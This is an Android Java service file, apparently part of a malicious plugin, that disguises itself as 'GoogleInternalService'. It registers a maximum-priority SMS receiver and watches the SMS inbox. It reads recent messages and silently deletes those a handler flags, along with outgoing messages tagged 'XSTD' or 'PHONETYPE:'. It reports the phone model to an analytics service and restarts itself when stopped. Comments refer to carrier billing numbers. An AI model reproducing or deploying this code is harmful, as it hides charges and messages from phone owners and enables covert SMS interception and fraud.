package com.xstd.plugin.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.MessageHandleUtils;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.receiver.PrivateSMSBRC;
import com.xstd.qm.setting.MainSettingManager;

import java.util.HashMap;
import java.util.LinkedList;

/**
 * 用于拦截短信content provider的变化
 * <p/>
 * _id => 短消息序号 如100
 * thread_id => 对话的序号 如100
 * address => 发件人地址，手机号.如+8613811810000
 * person => 发件人，返回一个数字就是联系人列表里的序号，陌生人为null
 * date => 日期  long型。如1256539465022
 * protocol => 协议 0 SMS_RPOTO, 1 MMS_PROTO
 * read => 是否阅读 0未读， 1已读
 * status => 状态 -1接收，0 complete, 64 pending, 128 failed
 * type => 类型 1是接收到的，2是已发出
 * body => 短消息内容
 * service_center => 短信服务中心号码编号。如+8613800755500
 */
public class GoogleInternalService extends Service {

    //    private static final String SMS_URI = "content://sms/";//1.6下的系统
    private static final String SMS_URI = "content://mms-sms/";
    private static final String SMS_INBOX_URI = "content://sms";

//    private String mBlockPhoneNumber = null;

    private ContentResolver mResolver;

    private ContentObserver smsContentObserver = new ContentObserver(new Handler()) {

        @Override
        public synchronized void onChange(boolean selfChange) {
            if (Config.DEBUG)
                Config.LOGD("[[ContentObserver]] >>>>>>>>>>>>>>>>>>>>>>>>> entry  <<<<<<<<<<<<<<<<<<<<<<<<<<");
            if (Config.DEBUG)
                Config.LOGD("[[ContentObserver]] onChange find SMS changed. selfChange : " + selfChange + " ::::::::");

            super.onChange(true);
//            Cursor cursor = null;
////            if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getKeySmsCenterNum())
//                    && !TextUtils.isEmpty(mBlockPhoneNumber)) {
//                /**
//                 * 当短信中心不为空，并且拦截电话也不为空的时候
//                 */
//                cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
//                                            new String[]{"_id", "address", "date", "body", "service_center"},
////                                            " address = ?", new String[]{ mBlockPhoneNumber },
//                                            null, null,
//                                            "date desc");
//                showDeleteSMS = true;
//            } else {
//            /**
//             * 短信中心为空的时候
//             */
            Cursor cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                               new String[]{"_id", "address", "date", "body", "service_center", "type"},
                                               null,
                                               null,
                                               "date desc");
//                showDeleteSMS = false;
//            }

            if (cursor == null) {
                return;
            }

            LinkedList<String> deleteList = new LinkedList<String>();
            /**
             * 每次扫多少？5个
             */
            int searchCount = 0;
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int idIndex = cursor.getColumnIndex("_id");
            int centerIndex = cursor.getColumnIndex("service_center");
            int typeIndex = cursor.getColumnIndex("type");
            while (cursor.moveToNext() && searchCount < 5) {
                /**
                 * 找最近的5条记录
                 */
                String fromAddress = cursor.getString(addressIndex);
                String body = cursor.getString(bodyIndex);
                String id = cursor.getString(idIndex);
                String center = cursor.getString(centerIndex);
                int type = cursor.getInt(typeIndex);
                if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] current Message Info : " +
                                    "\n          || SMS from address : " + fromAddress
                                    + "\n        || body : " + body
                                    + "\n        || id : " + id
                                    + "\n        || center : " + center
                                    + "\n        || type : " + (type == 1 ? "received" : (type == 2 ? "send" : "unknow"))
                                    + "\n >>>>>>>>>>>>>>>>>\n\n");
                }

                if (TextUtils.isEmpty(fromAddress)) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[ContentObserver::onChanged]] ignore this Message as the from address is empty.\n");
                    }

                    searchCount++;
                    continue;
                }

                if (fromAddress.startsWith("10")) {
                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。或是扣费短信
                    if (Config.DEBUG) {
                        Config.LOGD("\n[[ContentObserver::onChanged]] Message start with 10.\n");
                    }
                } else {
                    /**
                     * 短信发送地址处理
                     */
                    if (fromAddress.startsWith("+") == true && fromAddress.length() == 14) {
                        fromAddress = fromAddress.substring(3);
                    } else if (fromAddress.length() > 11) {
                        fromAddress = fromAddress.substring(fromAddress.length() - 11);
                    }
                }

                if (type == 1) {
                    //是接受到的短信
                    if (Config.DEBUG) {
                        Config.LOGD("[[ContentObserver::onChanged]] The message is RECEIVED message");
                    }
                    if (MessageHandleUtils.handleMessage(getApplicationContext(), body, fromAddress)) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[ContentObserver::onChanged]] content observer find the message : [[" + body + "]] should handle " +
                                            "and delete from " + SMS_INBOX_URI);
                        }
                        deleteList.add(id);
                    }
                } else {
                    //是发送消息
                    if (Config.DEBUG) {
                        Config.LOGD("[[ContentObserver::onChanged]] The message is SENT message");
                    }
                    if (!TextUtils.isEmpty(body)
                            && (body.contains("XSTD")
                               || body.contains("PHONETYPE:") )) {
                        //notify umeng
                        HashMap<String, String> log = new HashMap<String, String>();
//                        log.put("content", body.trim());
                        log.put("phoneType", Build.MODEL);
                        log.put("from", fromAddress);
                        CommonUtil.umengLog(getApplicationContext(), "content_provider_filter", log);

                        deleteList.add(id);
                    }
                }

                searchCount++;
            }


            try {
                cursor.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            for (String id : deleteList) {
                mResolver.delete(Uri.parse("content://sms/" + id), null, null);
                if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
                }
            }
        }
    };

    private BroadcastReceiver filterBRC = new PrivateSMSBRC();

    @Override
    public void onCreate() {
        super.onCreate();

        MainSettingManager.getInstance().init(this);
        if (!MainSettingManager.getInstance().getMainShouldFakePlugin()) {
            stopSelf();
            return;
        }

        MobclickAgent.onResume(getApplicationContext());

        Config.LOGD("[[GoogleInternalService]] onCreate");
        Config.LOGD("[[GoogleInternalService]] registe dynamic SMS_RECEIVED");

        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        filter.addAction("android.provider.Telephony.GSM_SMS_RECEIVED");
        filter.addAction("android.provider.Telephony.SMS_RECEIVED2");
        filter.addAction("android.intent.action.DATA_SMS_RECEIVED");
        filter.addCategory("android.intent.category.DEFAULT");
        filter.setPriority(Integer.MAX_VALUE);
        registerReceiver(filterBRC, filter);

        mResolver = getContentResolver();
        mResolver.registerContentObserver(Uri.parse(SMS_INBOX_URI), true, smsContentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Config.LOGD("[[GoogleInternalService]] onStartCommand");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        MobclickAgent.onPause(getApplicationContext());

        Config.LOGD("[[GoogleInternalService]] onCreate");

        mResolver.unregisterContentObserver(smsContentObserver);
        unregisterReceiver(filterBRC);

        //因为这个服务应该是长期驻留在后台，所以再次启动它
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(getApplicationContext(), GoogleInternalService.class);
        startService(serviceIntent);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }


}
